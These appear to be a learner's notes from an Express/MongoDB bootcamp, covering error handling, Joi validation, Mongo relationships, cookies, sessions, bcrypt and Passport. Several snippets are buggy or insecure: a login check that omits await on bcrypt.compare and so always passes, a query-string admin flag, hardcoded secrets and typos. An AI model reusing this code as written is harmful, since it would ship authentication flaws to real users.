        next(new ExpressError("page not found", 404));
      });
  ex. app.use((err, req, res, next) => {
        const {status = 500, message= 'error!'} = err;
        res.status(status).send(message);
      });

- although we will adopt a different solution later, we can do this thing
ex. app.post('/campgrounds', catchAsync(asyn (req, res, next) => {
        if(!req.body.campground) throw new ExpressError('Invalid Campground Data!', 400)
        ...
    }))

~> to deal with the new campground data error specifically
~> before it reaches mongoose!

~> and here, we "throw" a new error, because there's catchAsync, and if error is thrown, it will lead to the error handler app.use later

- now we can catch both express-thrown errors and the errors that we threw!

<br>

#### 443. Defining Error Template
- views > error.ejs
  
~> let's start with a simple alert!
~> in app.js,
ex. app.use(... res.status(status).render('error', {err}))

~> then showing <%=err.message%> and <%=err.stack%> (solely for development purpose) in the error page itself!

<br>

#### 444. JOI Schema Validationa
- JOI.DEV/API/?V=17.3.0
- joi lets you describe the data using a simple intuitive and readable language
~> JavaScript validator tool 

- we have client-side validation, but barely have server-side one
~> we do have
ex. if (!req.body.campground) throw new ExpressError(...),
~> but this only checks if "campground" property is there, and even if we're missing ex. campground[price], it will not throw an error

~> we can manually check for all the error-generating cases, but it's a lot of work!

- ex. in terminal,
  ex. npm install joi

- in app.js,
  ex. const Joi = require('joi') 

- now we need to define a schema!

1. Define a Schema for some data in javascript
ex. in our case, it will be a Schema for req.body
2. Then can validate data by running it through Schema

3. That will give us an error message if there's any error 

- let's put our schema in
ex. app.post(...)!!

~> it's NOT mongoose schema: this schema will validate the data even before the data goes to mongoose!    

ex. const campgroundSchema = Joi.object({
        campground: Joi.object({
            title: Joi.string().required(),
            price: Joi.number().required().min(0)
        }).required()
    })
    const {error} = campgroundSchema.validate(req.body)

    if (error){
        const msg = error.details.map(el => el.message).join(',')
        //joining elements in the object array (error.details)
        //into a new array!

        throw new ExpressError(msg,400)
    }
<br>

#### 445. JOI Validation Middleware
- now we have two layers of validations! one on server-side, the other on client-side

- because we want to use the Joi validation at more than one place, let's separate it to a middleware

ex. const validateCampground = (req, res, next) => {
        const campgroundSchema = {...}
        if (error) ...
        else next()
    }
    //(req, res, next) to specify that this is a middleware function
    
    //we will eventually separate it into a new file after learning about ExpressRouter,etc.

- Schemas.js
: ex. const Joi = require('joi')
: ex. module.exports.campgroundSchema = Joi.object({})

- in app.js,
ex. const {campgroundSchema} = require('schemas.js')

<br>

## 44. Data Relationships With Mongo
#### 446. What Matters In This Section
- Crucial!
: One to Few
: One to Many
: One to Bajillions
: Populate

- Important
: Mongo Schema Design

- Nice To Have
: SQL Relationships Overview

<br>

#### 447. Introduction to Mongo Relationships
- relationships among data and Mongo!

<br>

#### 448. SQL Relationships Overview
- "Relational Databases"
- using multiple databases and relationships among data

- at some point, spend some time in learning SQL!!
: very useful

<br>

#### 449. One to Few
- So, how to implement relational database in Mongo?

- There are SO many ways to structure database in Mongo
~> and what Colt is showing is just a tiny tiny bit of Mongo
~> takes a lot of time to really master it!!

1. One to Few
2. One to Many
3. One to Gajillions

- One To Few
: Embed the data directly in the document!

ex. user - address
~> little possibility that the user will have hundreds of addresses
~> or that addresses will be used without the info of the user
~> just store the address data directly under user data

- in Mongo_Relationship folder,
ex. npm init -y
ex. npm install mongoose

ex. mkdir Models

ex. touch Models/user.js

~> mongoose connection

~> mongoose Schema (userSchema)

~> makeUser (instance!)

- note. _id: {id:false}
=> to turn off the automatic assignment of id!

- One To Many
- second, let's make a "FARM" schema!!
~> products: cf. MONGOOSE - POPULATE
~> set the type of each product element as Object ID

- cf. mongoosejs.com/docs/populate.html
~> "Population is the process of automatically replacing the specified paths in the document with document(s) frm other collection(s). We may populate a single document, multiple documents, a plain object, multiple plain objects, or all objects returned from a query."
~> "The ref option is what tells Mongoose which model to use for population"

- ex. const mongoose = require ('mongoose');
  ex. const {Schema} = mongoose;
  
  ex. products: [{type: Schema.Types.ObjectId, ref: 'Product'}]

- by specifying 'ref', instead of typing every single object id, the population is done quickly and easily

- makeFarm()
~> when you see db.farms.collections(),
~> product is called as an object id!

~> So MONGO stores Object Id's rather than the data itself in db!

<br>

#### 451. Mongoose Populate
- this is where 'ref' comes in!

- ex. Farm.findOne({name: 'Fully Belly Farms'})
    .populate('products')
    .then(farm => console.log(farm));

<br>

#### 452. One to "Bajillions"
- One To Bajillions
: With thousands or more documents it's more efficient to store a reference to the parent on the child document.

ex. {
        tweetText: 'adjfalkdfj',
        tags: ['moron', 'yo'],
        user: ObjectId('290128093821')
    }

~> rather than saving all the tweets (child) to the user (parent), more efficient to save the user info (parent) to each tweet (child)
~> as we ususally don't need ALL the tweets at once, etc.

- ex. tweet.js
~> tweets - user model

- each tweet has an object id as their user!

- now we can populate the 'user' field in 'tweet'!!

- you can even populate only the chosen fields!
~> "Field Selection"
~> ex. .populate('user', 'username')

<br>

#### 453. Mongo Schema Design
- https://www.mongodb.com/blog/post/6-rules-of-thumb-for-mongodb-schema-design-part-3
~> b/c  mongo provides so much freedom, sometimes it could be overwhelming to start building stuff

~> blog post is VERY USEFUL in figuring out that!! (especially, THOSE SIX RULES))

- "denormalization" : having some duplicate data
~> in SQL, almost never do it
~> but in Mongo, if it makes sense, you can store some frequently used data as duplicates in different Schema_places!
~> 'two-way referencing'!

<br>

## 45. Mongo Relationships with Express
#### 454. What Matters In This Section
- Crucial
: Deleting With Mongo Middleware

- Important
: NOTE - Farm and Product are just specifics here
: Defining Our Farm & Product Models
: Creating Farms
: Farms Show Page

<br>

#### 455. Defining Our Farm & Product Models
- Thought Process
: we don't want to embed products to farms
: as we would want to see all the products too
: and would make sense to implement the two-way relationship!

<br>

#### 456. Creating New Farm
- db name: farmStandTake2
- here, we are simplifying
~> but in the real world, you want to validate data & do some error handling!

<br>

#### 457. Farms Show Page!
- similar to Products Show Page

<br>

#### 458. Creating Products For A Farm
- for this app, let us make it possible to add a product to each farm
- important: we will include the farm id inside the web route
ex. /farms/:farm_id/products/new

ex. and post the request to
ex. /farms/:farm_id/products
~> although of course, there are other ways to implement these!
~> ex. hide the id and send it inside req.body or sth
~> while what we are doing is a very common practice as well

- ex. farm.products.push(products)
  ex. product.farm = farm
  ex. await farm.save();
  ex. await product.save();

<br>

#### 459. Finishing Touches
- we should show all the products for each of the farms
- in index.js,
ex. app.get('/farms/:id',async(req,res)=>{
      const farm = await Farm.findById(req.params.id).populate('products');
      res.render('farms/show',{farm})
});

<br>

#### 460. Deletion Mongoose  Middleware
- ex.app.delete('/farms/:id' , async (req, res) => {
        const farm = await Farm.findByIdAndDelete(req.params.id);
        res.redirect('/farms')
})

- when deleting a farm, we want to delete its products
~> fist option: find the products with farm id and delete them

~> second option : more work upfront but nicer
: we will choose this way
: using Mongoose  Middleware!

- note. in doc, we can see that .findByIdAndDelete() triggers .findOneAndDelete()

- findOneAndDelete ~> "Query middleware": 'this' refers to the query vs. "Document middleware" this refers to the doc

- we need to wait until after the query has been completed so that we have access to the document found

- note that mongoose middleware is not the same as express middleware

- in the mongoose doc, instead of calling next() manually you can use a fn returning a promise i.e. async/await

- in farm.js, below Schema definition,
: before we compile  the actual model,
ex. ...
ex. farmSchema.pre("findOneAndDelete", async function (data) {
        console.log(data)
})
ex. farmSchema.post("findOneAndDelete", async function (data) {
        console.log(data)
})
=> we can see that the POST MIDDLEWARE has access to the deleted data
ex. farmSchema.post("findOneAndDelete", async function(farm) {
        const res=await Product.deleteMany({_id: {$in:  farm.products}})
})

<br>

## 46. YelpCamp - Adding The Reviews Model
#### 461. Defining The Review  Model
- new model! with body and rating (review.js)

<br>

#### 462. Adding The Review Form
- Add in a new form to make a new review!
- let's start with a range slider
- views > campgrounds>show.ejs

<br>

#### 463. Creating Reviews
- Setting routes for the review and actually making one
~> let's adopt the route '/campgrounds/:id/reviews'

- in app.js,
ex. const Review = require('./models/review.js')

ex. app.post('/campgrounds/:id/reviews', catchAsync(async (req, res) => {
        const campgrounds = await Campground.findById(req.params.id);
        const review = new Review(req.body.review);
        campground.reviews.push(review);
        await review.save();
        await campground.save();
        res.redirect (`/campgrounds/${req.params.id}`);
    }));

<br>

#### 464. Validating Reviews
-  slider: default present, so no validation required
- textarea: make it required

- recap...
~> we put
~> <form novalidate...>
~> not to validate with HTML validation!!

~> but in JS (boilerplate.ejs),
~> all forms : ".validated-form => we add this
~> to validate with JS

- Despite the fact that we did client-side validation, still some malicious attempt without valid rating or review can be posted using Postman, AJAX, etc.
~> we do the same thing with Joi which we did for campground validation (cf. schemas.js)

- in schemas.js, add reviewSchema

- in app.js, require reviewSchema && set up a middleware
ex. const {campgroundSchema,  reviewSchema} = require('./schemas.js')

ex. const validateReview = ...

- and again in app.js, add that middleware to app.post('.../reviews', validateReivew, ...)

<br>

#### 465. Displaying Reviews
- in our route, we first need to **_populate_** the reviews so that they can be displayed, not in object id's anymore
ex. app.get('/campgrounds/:id',....
        const campground =await Campground.findById(req.params.id).populate("reviews"));

- then in show.ejs,  let's display the reviews in a pretty way!

ex. <% for (let review of campground.reviews) {%>
          <div class="mb-3">
            <p>Rating: <%= review.rating %></p>
            <p>Review: <%= review.body %></p>
          </div>
    <% }%>

- if too many junk reviews,
ex. db.reviews.deleteMany({})

<BR>

#### 466. Styling Reviews
- with card class

<br>

#### 467. Deleting Reviews
- new route!
ex. app.delete('/campgrounds/:id/reviews/:reviewId' , catchAsync(async (req, res) => {
        res.send("DELETE ME!")
})

// we want to delete the reference in the campground and the review itself and that is why we access both id's

- Add the delete form for each review

- to remove the review reference in the campground object, we use the mongo operator $pull!!
+~> $pull  removes from an existing array all instances of a value or values that match a specified condition

ex. {$pull: {<field1>: <value|condition>, <field2>: <value|condition>,...}

ex. const {id, reviewId} = req.params;
ex. await Campground.findByIdAndUpdate(id, {$pull: {reviews: reviewId}})

<br>

#### 468. Campground Delete Middleware
- mongoose middleware again!
- ex. CampgroundSchema.post('save/clear/...')
~> not super clear which one to use
~> refer to the documentation!

- Mongoose has 4 types of middleware
: document middleware, query middleware, model middleware, and aggregate middleware

- ex. Model.findByIdAndDelete()
~> this function triggers findOneAndDelete()

- So in campground.js,
ex. CampgroundSchema.post('findOneAndDelete', async function(doc){
      if(doc){
          await Review.deleteMany({
              _id: {
                  $in: doc.reviews
              }
          })
      }
    })

~> "POST-middleware" which runs after "findOneAndDelete"

- it could be confusing b/c this "query" middleware does not have "this"keyword we can use, which other middlewares have

- NOTE. if we change the way that the campground is deleted (ex. NOT .findByIdAndDelete), the  query middleware written above will not work, as 'findOneAndDelete' is not triggered

<br>

## 47. Express Router & Cookies
#### 469. What Matters In This Section
- Crucial!
: Express Router Basics
: Understanding Cookies
: Cookie Parser

- Important
: Singed Cookied

- Nice To Have
: HMAC Signing

<br>

#### 470. Express Router Info
- Express has various types of routes (post/get/put/...) we can directly put on 'app', and that's why we can have many routes in one document (ex. app.js)

- however, for a large app, the file will get too long
- so we'll use ** express.Router([options])**
~> it creates a new router object

- "A router object is an isolated instance of middleware and routes. You can think of it as a 'mini-application,' capable of performing middleware and routing functions. Every Express application has a built-in app router."

~> 'mini-application' which we can combine with other routers to build a full application


- ex. /shelter
  ex. /shelter/new
  ex. /shelter/:id ...

  ex. /dogs
  ex. /dogs/new
  ex. /dogs/:id ...

  ~> with router, we can 'group the routes together

- RouterDemo > routes

- in shelters.js,
ex. const express= require('express');
    const router = express.Router();

    router.get('/shelters', (req, res) => {
      res.send("shelters")
    })

    router.get('/shelters/:id', (req, res) => {
      res.send("viewing one shelter")
    })

    router.get('/shelters/:id/edit', (res, req) => {
      res.send("editing")
    })

    module.exports = router;
    //created a new empty router & added three ones

- and in index.js,
ex. const shelterRoutes = require('./routes/shelters')

- requiring is not enough // we gotta tell app, which is serving port 3000, to use the required router

~> in the doc, "you can then use a router for a particular root url in this way separating your routes into files or even mini-apps"
~> //only requests to "/calendar /*"will be sent to our 'router'
~> app.use('/calendar',router)

- so in index.j,s
ex. app.use('/', shelterRoutes);
- OR, you can do
ex. app.use('/shelters', shelterRoutes);
~> and remove all the 'shelters'parts in shelters.js

- modifying the start routes is also easier with one spot

<br>

#### 471. Express Router & Middleware
- you can set a middleware to only apply to a certain router too!

ex. admin.js ~> let's see if the user is actually the admin (using a fake validation middleware)

- in admin.js,
ex. router.use((req, res, next) => {
        if(req.query.isAdmin){ 
          next();
        }
        else{
          res.send('sorry not an admin');
        }
    })

=> you can only apply it to that route this way

=>vs. definig it as a function and passing it into individual routes! ex. app.get('/aejfkljaiolk', some_middleware, (req, res) => {...})

<br>

#### 472. Introducing Cookies
- Cookies
~> What are they??
~> Cookies are little bits of information that are stored in a user's browser when browsing a particular website

~> Once a Cookie is set, a user's browser will send the cookie on every subsequent request to the web site

~> Cookies allow use to make HTTP stateful

- uses of cookies : session management, personalization, tracking, etc

- Chrome - developer tool - application - cookies
~> so many data saved and sent through cookies

<br>

#### 473. Sending Cookies
- express doc => res.cookie(name, value  [, options])
~> sets cookie **name** to **value**.
~> the  **value** parameter may be a string or object converted to JSON

- in index.js,
ex. app.get('/setname', (req, res) => {
      res.cookie("name", "stevie chicks");
      res.send("OK SENT YOU A COOKIE!");
    });
  
~> if we reach that route, we can see in Chrome the cookie w/ name: stevie chicks

~> once we reach it, even if we go to other routes the cookie is sent with the stored info

<br>

#### 474. Cookie Parser Middleware
- https://www.npmjs.com/package/cookie-parser

- we find cookies
~> in req.cookies!

- Express does not have a cookie parser as a built-in
~> npm install cookie-parser

- ex. const cookieParser = require('cookie-parser')
  ex. app.use(cookieParser())
~> now on every request, we have a property called 'req.cookies'

- ex. in index.js
  ex. app.get(...

        const {name = 'default'}= req.cookies..)

- remember cookies are not used to 'store' data though
- they are for statefulness

- it's the browsers that do the work

<br>

#### 475. Signing Cookies
- 'Signed' cookies: kind of a digital signature, verifying the integrity of it

- with 'cookie-parser' we can sign the cookies 

- 'signing' is not about hiding or encrypting the data, but is about validating that the info sent is the same as the info received 

- ex. app.use(cookieParser('thisismysecret')); //this string is used to sign the cookies

- ex. app.get('/getsingedcookie',(req, res) => {
        res.cookie('fruit', 'grape', {signed: true})
      })

      //we get back sth like '%3Agrape.LMNZojp%2FiR9Tsj50P0ysA22deJjrP0awUK0S8R3lT' as the cookie and we can indeed see 'grape' in it
      //not about hiding the info

- ex. app.get('/verifyfruit', (req, res) => {
        res.send(req.singedCookies)
      })

- Signed cookies are stored in a different object 'req.signedCookies'
~> express doc!

- after cookies are signed, even if those cookies are manually changed or sth, it is noticed and req.signedCookies return ex. {'fruit':false}

- if you change the key to cookieParser(key) the previous cookies become unavailable!

<br>

#### 476. OPTIONAL-HMAC Signing
- freeformatter.com/hmac-generator

- hmac - to validate the integrity (unchanged?) and authenticity (who sent it?)

<br>

## 48. Express Sessions & Flash
#### 477. What Matters In This Section
- Crucial!
: Conceptual Overview of Session
: Setting Up Express Session

- Important
: Integrating Flash Messages

<br>

#### 478. Introduction to Sessions
- Sessions!
: it's not very practical (or secure) to store a lot of data client-side using cookies.
: this is where sessions come in!
: sessions are server-side data store which we use to make HTTP stateful!
: instead of storing the data using cookies we store the data on the server-side and then send the browser a cookie that can be used to retrieve the data.
: a diagram might be helpful

- enabling some statefulness to HTTP that is inheritly stateless

- nothing wrong with cookies, but there are two drawbacks compared to sessions!
1. cookies have a maximum size
2. cookies are not as secure as storing data on the server side

- so... we store data on the server-side using SESSIONS, and give some COOKIES as the key to those to client

ex. data store          / SERVER              / CLIENT
      id, shopping cart   -- your session ID is 4-->

ex. CLIENT                    / SERVER

          I have a cookie for you
          -- my session ID is 4 -->

<br>

#### 479. Express Sessions
- npm install express-session

- SessionDemo

- require express sessions and use them as a middleware

- configuring express sessions can be a one- or two-hour content tbh!

- what we will focus on is
~> 'secret' - we need it for the same reason as a cookie-parser

~> express-session is going to "sign" the cookie and pass it back

- in index.js,
ex. const session = require ('express-session')

ex. const sessionoptions = {secret: 'thisisnotagoodsecret'   , resave: false,   saveUninitialized}
ex. app.use(session(sessionoptions))
~> again in the real world, you would want it to be an actual secret, like as an environmental variable!

~> as it's a middleware, all the incorming "request" objects would have session property available!

- ex. app.get('/viewcounts', (req, res) => {
        res.send("YOU HAVE VIEWED THIS PAGE X TIMES")
      })

- now we see "connect.sid" cookie, which is generated by express-session

~> sid as session id

~> as long as we have the sid the browser will know that we are 'that' user

~> that is why when we open a website in a differnt platform the browser does not have information about us

- ex. app.get('/viewcounts', (req, res) => {
          if (req.session.count) 
              req.session.count +=1; 
          } else {
              req.session.count = 1;
          }
          res.send(`You have viewed this page ${req.session.count} times`)
      })

~> req.session.count does not exist from the first place
~> while we can add any data to req.session
~> and that data on session is stores on the server-side and associated with individual users/browsers

- the info is saved in JS in memory
~> not what we would do for production

~> express-session - default session storage is memory store
~> Warning in the same Doc! 'memory store is meant to be used for debugging and development, and it not recommended for production, as it will leak memory under most conditions, does not sclae past a single process'

~> in the real world for production enviornment, we can use one of many options of sessionStores[ex. connect-redis, connect-mongo]

- recap: the session has all the data, and gives back only one cookie, which is the session id. The session id is sent on all subsequent requests and express session looks for the appropriate data in the session store with the sid. And if there's data in the session store that is accessible through req.session

<br>

#### 480. More Express Sessions
- refer to #### 479

- whenever the web page is restarted we get the new sid and the new counts!

~> as memory store's used
~> in local memory on the server-side not in persistent data store
~> but as long as our session is running it is fine

- Register & Greet

<br>

#### 481. Intro To Flash

- kinda related topic to sessions and cookies!

- github.com/jaredhanson/connect-flash

- there are other variants like express-flash and for different programming languages and for different frameworks and so on  

- the basic idea of FLASH
~> a place in the session to FLASH a message to users (ex. success, confirmation) which go away!

~> typically after some action & before you redirect somewhere

- let's add functionalities to Section 45 Farm + Product App with Flash

- npm install connect-flash

- configure session! as connect-flash relies on sessions
ex. const flash=require('connect-flash');
ex. app.use(flash());

- once the flash middleware is in place, all requests will have a req.flash()function

- req.flash(key, msg)

- key incl. 'error', 'info', 'success', etc..

- usually flash right before redirect
ex. app.post('/farms', async (req, res) => {
        const farm = new Farm(req.body);

        await farm.save();

        req.flash('success', 'Successfully made a new farm')
        res.redirect('/farms')
    })

- AND in /farms,
ex. ...
ex. req.render('farms/index',{farms, messages: req.flash('success')})
ex. ...
//meaning if there is any req.flash w/'success' it will be passed through as messages

- then in index.ejs,
ex. <body>
      <%= messages %>
      ...

<br>

#### 482. Flash and Res.locals
- could be annoying to include 
ex. messages: req.flash('key!')

~> what about having a middleware then?

- express doc ~> res.locals!!

- Res.locals
~> object which contains response local variables  scoped to the request and therefore available only to the view(s) rendered during that request&response cycle (if any). Otherwise, this prop is identical to app.locals.

~> this prop is useful for exposing request-level informatioin like the request path name, authenticated user, user settings, and so on.

=> we can add ANY stuff to res.locals!!

- ex. app.use((req, res, next)=>{
        res.locals.messages=req.flash('success')
        next();
      })

  //at the beginning!!

  //now ALL the routes go through that, and messages are displayed if there are

- usually, <%=message%> part in .ejs is also dealt with using partials

- if your app has multiple apps (ex. success, error), you can do sth like

ex. res.locals.success
ex. res.locals.error

- you can also easily style flash msgs

<br>

## 49. YelpCamp: Restructuring & Flash
#### 483. Breaking Out Campground Routes
- let's break out /campgrounds & /reviews

- folder routes > campgrounds.js & reviews.js

- ex. const express = require('express')
  ex. const router = express.Router()

- move all the applicable routes to the corresponding file and change app. to router., and remove /campgrounds cuz it will be handled by the below app.use

- then in app.js,
ex. const campgrounds= require ('./routes/campgrounds')
ex. app.use('/campgrounds',campgrounds)

- copy catchAsync, ExpressError, validateCampground middleware and so on from app.js to campgrounds.js

<br>

#### 484. Breaking  Out Review Routes
- repeating the same process!

- '/campgrounds/:id/reviews'

- we should specify the option like

ex. const router =  express.Router({mergeParams: true})
// so that parameters are not separated  by default by  Express router!

<br>

#### 485. Serving Static Assets
- we should add our public directory & serve the static assets!
~> for imgs, custom stylesheets and JS

- public folder

- usually src="/hello.js", not src="/public/hello.js", if they are in public folder!
~> in order to make it work, in app.js, 
ex. app.use(express.static(path.join(__dirname,'public')))

- we will eventually want some custom-styles
~> public > javascripts / stylesheets

- let's move the validation stuff from *boilerplate.ejs* to *validateforms.js*, in the javascripts directory!!!!

- to make the deprecation warning go away, set useFindAndModify:false in mongoose connection setting in app.js!

<br>

#### 486. Configuring Sessions
- Now we want to set up Express sessions
1. to use flash
2. to introduce authentication and for that, we want session access

- ex. npm install express-session

- in app.js
ex. require, set session configuration, and use

- then add fancier option to cookies we would send back!
ex. const sessionConfig = {
        secret: 'thisshouldbeabettersecret!',
        resave: false,
        saveUninitialized: true,
        cookie: {
          httpOnly: true,
          expires: Date.now() + 1000 * 60 * 60 * 24 * 7 ,
          maxAge: 1000 * 60 * 60 * 24 * 7
          //Date.now() is in ms
        }
    }

- HTTP Only: true => ref:  owasp.org/www-community/HttpOnly
~> not allowing client=-side script to access protected cookies 

<br>

#### 487. Setting Up Flash
- install, require, use
- in campground routes, let's use flash

<br>

#### 488. Flash Success Partial
- partials / flash.ejs

- in flash.ejs,
ex. <%- if (success && success.length){ %>
    <div class = "alert alert-success alert-dismissible fade show" role = "alert" >
    //role = " alert" for accessibility purpose
      <%= success %>
      <button type="button" class="btn-close"data-bs-dismissible="alert" aria-label="Close">
      </button>
    </div>
    <% } %>

  - apply wherever fitting

<br>

#### 489. Flash Error Partial
- do the same thing for error messages

- ex. router.get('/:id',...
        if(!campground) {
            req.flash('error', 'Campground not found!')
            return  res.redirect('/campgrounds')
        })
      ...
      )

<BR>

## 50. Authentication From "Scratch"
#### 490. What Matters In This Section
- Crucial!
: Authentication vs. Authorization
: How To (Not) Store Passwords
: Working With Bcrypt

- Important
: Auth Demo
: Understanding Hashing Function
: Password Salts

<br>

#### 491. Authentication vs. Authorization
- Passport: Simple, unobtrusive authentication for Node.js
~> will use this later for YelpCamp!

- Authentication
: Authentication is the process of verifying who a particular user is
: We typically authenticate with a username or password combo, but we can also use security questions, facial recognition, etc.

- Authorization
: Authorization is verifying what a specific user has access to
: Generally, we authorize after a user has been authenticated. "Now that we know who you are, here's what you are allowed to do and NOT allowed to do"

<br>

#### 492. How to (not) Store Passwords
- Rule #1 - Never Store Passwords

- Hashing
: The SOLUTION!
: Rather than storing a password in the database, we run the password through a hashing function first & then store result in the database!

- Hashing Functions
: Hashing functions are functions that map input data of some arbitrary size to fixed-size output values

<br>

#### 493. Cryptographic Hashing Functions
- Cryptographic Hash Functions!
1. One-way function which is infeasible to invert
2. Small change in input yields large change in the output
3. Deterministic -same input yields same output
4. Unlikely to find 2 outputs with the same value(small possibility of hash collision!!)
5. Password Hash Functions are deliberately SLOW 

<br>

#### 494. Passwords Salts
- there are not THAT many hash functions suitable for passwords
~> we will use BCRYPT

- Password salts
~> A salt is a random value that is added to the pw before being hashed
~> This helps ensure unique hashees and mitigate common attacks! ex.reverse lookup!
~> A libary can help

<br>

#### 495. Into to Bcrypt!S
- github.com/keletiv/node.bcyrpt.js

- Bcrypt itself has been there for a while, and it's been implemented in all sorts of languages

- for JS, we gotta install two packages!

1. bcrypt
~> what we will use! made for Node, server-side JS
2. bcrypt.js
~> written entirely in JS, with NO dependencies
~> runs on client-side [on a browser] as well, even though we don't need that

- we use the planar 'bcrypt' becasue we do not need it to run on the browser too

- BcryptDemo

- ex. npm i bcrypt

- we will start with just looking into 'bcrypt' methods w/o express

1. genSalt 
~> generates password salt
~> 'saltRounds' : number of rounds. difficulty level (proportional to process time)
~> 'ideal goal' is ~ 250 ms, and recommended number is ~12
~> as the saltRounds goes up, the time it takes will grow exponentially

2. hash
~> takes the password and salt, and returns hashed pw
~> supported in callback functions / promises [async - await]
~> we will use the promise form!

- ex. const bcrypt = require('bcrypt')
ex. const hashPassword = async(pw) => {
        const salt = await bcrypt.genSalt(10)
        const hash = await bcrypt.hash(pw, salt)
        console.log(salt)
        console.log(hash)
    }

ex. hashPassword('monkey');

- can see that the salt is a part of the hashed pw
~> when bcrypt 'compares' the input pw and stored hashed pw,
~> it can figure out which is the salt part and can compare only the rest,
~> so we do not need to store the salt data anywhere

- then to compare..
ex. bcrypt.compare(plainPassword, hash)

ex. const login = async (pw, hashPassword) => {
        const check = bcrypt.compare(pw, hashPassword)
        if (check){
          console.log("LOGGED YOU IN! SUCCESSFUL MATCH!!")
        } else {
          console.log("INCORRECT")
        }
    }

- Note that we can generate Salt & Hashed PW at the same time
ex. bcrypt.hash(plainPassword, saltRounds, function..)
ex. ... bcrypt.hash(pw, 12)

<br>

#### 496. Auth Demo App
- let's make a very simple app implementing the authentication

- AuthDemo

- ex. npm i express ejs mongoose bcrypt

- ex. touch index.js
- ex. mkdir views models

- user Model!

- ex. index.js!

<br>

#### 497. Auth Demo: Register
- connect to mongo

- get id and pw from 'register' form
~> post to '/register' using the parsed (through express.urlencoded({extended: true}))req.body
~> take that username and that pw to create a new user! (the User model) after hashing the pw using Bcrypt

- in index.js,
ex. app.post(..)

<br>

#### 498. Auth Demo: LogIn
- (1) create a form (2) set up a route to post

- ex. app.get('/login', (req, res) => {
        res.render('login')
      })

- login.ejs

- index.js,
ex. app.post('/login', async (req,res) => {
        const {username, password} = req.body
        const user = await User.findOne({username: username})
        
        const validPassword = await bcrypt.compare(password, user.hashedPassword)
        
        if (validPassword){
            res.send('YAY WELCOME!')
        }
        else {
            res.send('TRY AGAIN')
        }
        
    })

<br>

#### 499. Auth Demo: Staying Logged In With Session
- npm install express -session

- ex. const session = require('express-session')
ex. app.use(session)

- when someone successfully log in, let's add STH to the session

- reminder: session store is associated with a particular COOKIE

~> connect.sid //automatically given as now using session
~> req.session.user_id = user._id
~> and if req.session.user_id exists, let them access to secret stuff

- 1. Register => make a user, hash the password, store them
2. Login => find the user on the database based on the entered username. If there's a match, check if the entered password matches the hashed password on the dabase.
3. log them in, adding the user_id to the session& use that data for later use

<br>

#### 500. Auth Demo: Logout
- logging out <=> removing the user id in the session!

- Reminder: the way that session works...
~> all stored on server side
~> a "SIGNED" cookie is sent back to the client
~> and it won't be verified if it's faked, or a user sends their own sid as a part of malicious attack

- so to log out, we need to rm user_id
ex. app.post('/logout',(req, res) => {
        req.session.user_id = null;
        res.redirect('/login')
    })

- secret.ejs ~> add post request form to /logout!

- another way to log someone out is to destroy the session entirely
ex. req.session.destroy()
~> destroys all the information

<br>

#### 501. Auth Demo: Require Login Middleware
- simple middleware to help verify if anyone is logged in/not!
~> b/c most of the times, what we want is to prevent MULTIPLE endpoints!
ex. const requireLogin =(req, res, next)=>{
        if(!req.session.user_id){
            return res.redireect('/login')
        }
        next();
    })

    //And pass this onto routes as necessary

<br>

#### 502. Auth Demo: Refactoring To Model Methods
- we want to move as much as possible out of route handler itself

~> add some logic, when appropriate, to the model

1. 
ex. app.post('/login', async (req,res) => {
      const {username, password} = req.body
      const user = await User.findOne({username: username})
      
      const validPassword = await bcrypt.compare(password, user.hashedPassword)
      
      if (validPassword){
          req.session.user_id = user._id;
          res.redirect('/secret')
      }
      else {      
          res.redirect('/login')
      }
    
    })

=> all we want to do is to find the password of the user and validate that
=> let's make our own method

- in user.js,
ex. userSchema.statics.findByUserIdAndValidate =async function(useranme, password){
        const foundUser = await this.findOne({username})
        //this refers to the particular model or User f
        
        const isValid = await bcrypt.compare(password, foundUser.password)
        return isValid ? foundUser : false;
}

//statics is where we can define methods to the User class (model) itself!
//NOT to particular instances of the user

~> shortend codes a little bit
~> more importantly, grouped the logic that applies to the User model

2. 
ex. app.post('/register',async (req, res)=>{
      const {username, password} = req.body;
      const hash = await bcrypt.hash(password,12)
      const user=new User({
          username,
          hashedPassword: hash
      })
      await user.save()
      req.session.user_id = user._id
      res.redirect('/')
    })

~> what about making Mongoose set the hashed password
~> so that in the router, simply only username and password can be passed in
~> and in the user model, the password is saved

ex. userSchema.pre ('save', async function ()  {
        if (!this.isModified ('hashedPassword')) return next();
        this.hashedPassword = await bcrypt.hash(this.hashedPassword, 12);
        next()
    })

<br>

## 51. YelpCamp: Adding In Authentication
#### 503. Intro to Passport
- Always important to know the theories behind it!

- http://www.passportjs.org/
- https://github.com/jaredhanson/passport-local
- https://github.com/saintedlama/passport-local-mongoose
- Passport
=> helps authentication into a Node app
=> comes with a bunch of possible strategies (ex. google login!)
=> but doesn't explicitly show how it does stuff, so make sure you are aware of how authentication & authorization  work

- let's start with PASSPORT-LOCAL (just with username & pw)
=> requires some changes

or PASSPORT LOCAL MONGOOSE which makes authorizing with mongoose even easier

- passport-local-mongoose depends on
~> passport-local and it depends on
~> passport

ex. npm install passport passport-local  passport-local-mongoose

<br>

#### 504. Creating Our User model!
- Passport Usage
~> define the User schema however you like
~> and add Passport as a plugin to that UserSchema!
ex. const passportLocalMongoose = require('passport-local-mongoose')
ex. const userSchema = new Schema({..})
ex. userSchema.plugin(passportLocalMongoose)
=> "Passport-local mongoose will add a usrname, hash and salt field to store the usrname, hashed pw & the salt val!"
=> "additionally adds some methods to your Schema!"

<br>

#### 505. Configuring Passport!
- in app,
ex. const passport = require('passport')
ex. const LocalStrategy = require('passport-local')

(note. Passport-Local-Mongoose is only in our Model)

ex. app.use(passport.initialize());
ex. app.use(passport.session)

~> in passport docs, "in a Connect or Express-based application, passport.initialize() middleware is required to initialize Passport."
~> "If your application uses persistent login sessions, passport.session() middleware must also be used."

- session should be used before passport-session

- ex. const User = require('./model/user');
ex. passport.use(new LocalStrategy(User.authenticate()))

~> 'Hello Passport, we'd like to use LocalStrategy (which we've downloaded and required), and for that LoacalStrategy, our authentication method will be located in the User model and is called .authenticate()'

- ex. passport.serializeUser(User.serializeUser())
~> 'a function used by Passport to serialize users into session'

ex. passport.deserializeUser(User.deserializeUser())
~> 'how to get the user out of the session'

- let's demonstrate how we'll register a User
ex. app.get('/fakeUser', async (req, res) => {
        const user = new User({email: 'colt@gmail.com', username: 'colttt'})
        const newUser = await User.register(user, 'chicken')
        
        res.send(newUser)
})

~> Passport-Local-Mongoose : register(usr, pw, cb) convenience method to register a new usr instance with a given password. Checks if usrname is unique.

- cf. Passport uses PBKDF2 as the hashing function

<br>

#### 506. Register Form
